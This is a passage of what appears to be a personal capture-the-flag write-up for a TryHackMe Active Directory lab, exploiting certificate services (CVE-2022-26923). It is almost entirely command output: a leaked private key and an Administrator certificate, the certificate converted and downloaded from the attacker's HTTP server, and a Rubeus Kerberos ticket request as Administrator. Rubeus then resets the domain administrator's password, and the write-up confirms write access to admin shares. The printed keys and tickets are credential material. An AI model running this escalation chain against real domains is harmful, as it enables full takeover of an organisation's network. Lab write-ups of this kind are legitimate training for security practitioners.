lGkNSbZGxRfNNj6iholGNB0CgYAcYX2AmEa4vJkf8c4ecAwQ3T+zNGHMiYWe2vhi
tJa3MLAZqECO+ySeP8Bw+T8yoI2oNUAuvosQSJXYrCKuAjoqt7Nbb9HK0iR5rW7B
fIBCZdqiNCWVWj40M1yjlbvJ3Z1FX/DZAnyKFT4vDWZbwfpqXUzxv833Z0ygm8qg
pgW3wwKBgQC3AdjTmd4Hy9/89bOZ/T+AVpSZ1rbPJl/a1MgE/pTTokbuKKASvYwY
v3eLIkVxwNkVl1WSccugKwv06txUHUr0t+42qhEemwZSv7hvA7HePVqCSdU40Okw
FOroN2LvavgtlXgn5JtBnJ6MBrGiSlr2dk99X+G4b7V0eEW5prPaCg==
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIGXTCCBUWgAwIBAgITGwAAAA8SWC5lmBQSNAAAAAAADzANBgkqhkiG9w0BAQsF
ADBcMRMwEQYKCZImiZPyLGQBGRYDY29tMRUwEwYKCZImiZPyLGQBGRYFZXJ1Y2Ex
FTATBgoJkiaJk/IsZAEZFgVsdW5hcjEXMBUGA1UEAxMObHVuYXItTFVOREMtQ0Ew
HhcNMjMwMjE2MjIxMDE3WhcNMjQwMjE2MjIxMDE3WjBuMRMwEQYKCZImiZPyLGQB
GRYDY29tMRUwEwYKCZImiZPyLGQBGRYFZXJ1Y2ExFTATBgoJkiaJk/IsZAEZFgVs
dW5hcjEOMAwGA1UEAxMFVXNlcnMxGTAXBgNVBAMTEFRyeSBUSE0uIEhhY2sgTWUw
ggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDiDrd1G28nG788j2OFAH/i
RGgkm4eAAlIql2h+GxHFdtl9g2oeQjoqX9eKT7hbi8HKkNBpua3VWga+aSj0y5pH
vtIIwzXkwM3nu8d+FpODP2ir4Y/bTsc7iz3CH70ahhSJC2D5n/dVYwY6msM25BTi
yiwqIuc0AeUDjpDgt332PQI4czAb+oqTWPyHfZIKOKtHNEQiFPcNcLFnWBkoFwdX
c5AWETGlhOTuLwZW8l2BjfBGkW5VgeWAWMcXttryM4CBYx8wCnPMknHZuzYNfDUa
mniKkyD3L5mrcWFyRgujMVMbYLXJqdcgpgR++GLvFl+onpunNOf4e5wFkhROCG9d
AgMBAAGjggMEMIIDADA+BgkrBgEEAYI3FQcEMTAvBicrBgEEAYI3FQiGqOlnh6jG
PIaBlwSB4/0rhaHxS4FKhtO7NoHe8WACAWQCAQowKQYDVR0lBCIwIAYIKwYBBQUH
AwIGCCsGAQUFBwMEBgorBgEEAYI3CgMEMA4GA1UdDwEB/wQEAwIFoDA1BgkrBgEE
AYI3FQoEKDAmMAoGCCsGAQUFBwMCMAoGCCsGAQUFBwMEMAwGCisGAQQBgjcKAwQw
RAYJKoZIhvcNAQkPBDcwNTAOBggqhkiG9w0DAgICAIAwDgYIKoZIhvcNAwQCAgCA
MAcGBSsOAwIHMAoGCCqGSIb3DQMHMB0GA1UdDgQWBBSOGWCpLOT1xOobBw7j3RPf
e2SPeDAoBgNVHREEITAfoB0GCisGAQQBgjcUAgOgDwwNQWRtaW5pc3RyYXRvcjAf
BgNVHSMEGDAWgBSwVuQVDTCXfO6YFdLBHVWyW4dytTCB0QYDVR0fBIHJMIHGMIHD
oIHAoIG9hoG6bGRhcDovLy9DTj1sdW5hci1MVU5EQy1DQSxDTj1MVU5EQyxDTj1D
RFAsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29u
ZmlndXJhdGlvbixEQz1sdW5hcixEQz1lcnVjYSxEQz1jb20/Y2VydGlmaWNhdGVS
ZXZvY2F0aW9uTGlzdD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBv
aW50MIHHBggrBgEFBQcBAQSBujCBtzCBtAYIKwYBBQUHMAKGgadsZGFwOi8vL0NO
PWx1bmFyLUxVTkRDLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNl
cyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPWx1bmFyLERDPWVydWNh
LERDPWNvbT9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNh
dGlvbkF1dGhvcml0eTANBgkqhkiG9w0BAQsFAAOCAQEAHuDtHb95nYsXd+W0SwWO
fQSEYPoYAWDiIW431UooP7NDkhJ4gumgNFOTGHRZJDGAH8Afm5OOScHoLrCkS1lH
ZCUn8Rq88vRf+ZmfCO8E3Vd9BzzfWJSvzGu3NSNoHn9eKYFbT7zoegOpdlyWoyUT
n1muTs9y17m6d7BjBEwR5k/TKtKJYkGMrwzETmozPTJyDpGuXcA+yTXLo+Mcwr7r
UbYNA0LowCkE/U//2kFX4PtY/hGgCjD1gLC3NohW6NVjqGzWtrXfUm1kxQeqia9w
2d39Cix0DgnetDCK7fw1p7ZYSd2qK30SxlK1C+5C1/CkI7X+W9fNNa1FrqQu2SaD
zA==
-----END CERTIFICATE-----

┌──(witty㉿kali)-[~/Downloads/Ghostpack-CompiledBinaries]
└─$ openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
Enter Export Password:
Verifying - Enter Export Password:
                                                                                   
┌──(witty㉿kali)-[~/Downloads/Ghostpack-CompiledBinaries]
└─$ ls
 Certify.exe                        LockLess.exe          SharpDPAPI.exe
 cert.pem                           README.md             SharpDump.exe
 cert.pfx  

┌──(witty㉿kali)-[~/Downloads/Ghostpack-CompiledBinaries]
└─$ python3 -m http.server 1337
Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
10.10.221.143 - - [16/Feb/2023 17:16:23] "GET /Certify.exe HTTP/1.1" 200 -

PS C:\THMTools> iwr http://10.8.19.103:1337/cert.pfx -outfile C:\THMTools\cert.pfx

┌──(witty㉿kali)-[~/Downloads/Ghostpack-CompiledBinaries]
└─$ python3 -m http.server 1337
Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
10.10.221.143 - - [16/Feb/2023 17:16:23] "GET /Certify.exe HTTP/1.1" 200 -
10.10.221.143 - - [16/Feb/2023 17:25:53] "GET /cert.pfx HTTP/1.1" 200 -

PS C:\THMTools> .\Rubeus.exe asktgt /user:Administrator /password:god /certificate:cert.pfx /outfile:ticket /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.0

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=Try THM. Hack Me, CN=Users, DC=lunar, DC=eruca, DC=com
[*] Building AS-REQ (w/ PKINIT preauth) for: 'lunar.eruca.com\Administrator'
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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

[*] Ticket written to ticket

[+] Ticket successfully imported!

  ServiceName              :  krbtgt/lunar.eruca.com
  ServiceRealm             :  LUNAR.ERUCA.COM
  UserName                 :  Administrator
  UserRealm                :  LUNAR.ERUCA.COM
  StartTime                :  2/16/2023 10:27:49 PM
  EndTime                  :  2/17/2023 8:27:49 AM
  RenewTill                :  2/23/2023 10:27:49 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  2Vm4QWtID/aW/b4JrUCe+A==
  ASREP (key)              :  5DFAA87BAA65B0004396E20C4A8ACA3F

PS C:\THMTools> .\Rubeus.exe changepw /new:Witty123 /dc:LUNDC.lunar.eruca.com /targetuser:lunar.eruca.com\Administrator /ticket:ticket

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.0

[*] Action: Reset User Password (AoratoPw)

[*] Using domain controller: LUNDC.lunar.eruca.com (10.10.221.143)
[*] Resetting password for target user: lunar.eruca.com\Administrator
[*] New password value: Witty123
[*] Building AP-REQ for the MS Kpassword request
[*] Building Authenticator with encryption key type: rc4_hmac
[*] base64(session subkey): nmFkH56Yas8m7PxiDk2gRg==
[*] Building the KRV-PRIV structure
[+] Password change success!

PS C:\THMTools> runas /user:lunar.eruca.com\Administrator cmd.exe
Enter the password for lunar.eruca.com\Administrator:
Attempting to start cmd.exe as user "lunar.eruca.com\Administrator" ...

Microsoft Windows [Version 10.0.17763.1098]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
lunar\administrator

┌──(witty㉿kali)-[~/Downloads/Ghostpack-CompiledBinaries]
└─$ smbmap -H 10.10.221.143 -u "Administrator" -p "Witty123"   
[+] IP: 10.10.221.143:445	Name: 10.10.221.143                                     
[|] Work[!] Unable to remove test directory at \\10.10.221.143\SYSVOL\WFJRCAHTLQ, please remove manually
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	READ, WRITE	Remote Admin
	C$                                                	READ, WRITE	Default share
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ, WRITE	Logon server share 
	SYSVOL                                            	READ, WRITE	Logon server share 

:)

Was really fun!
```



[[CVE-2022-26923]]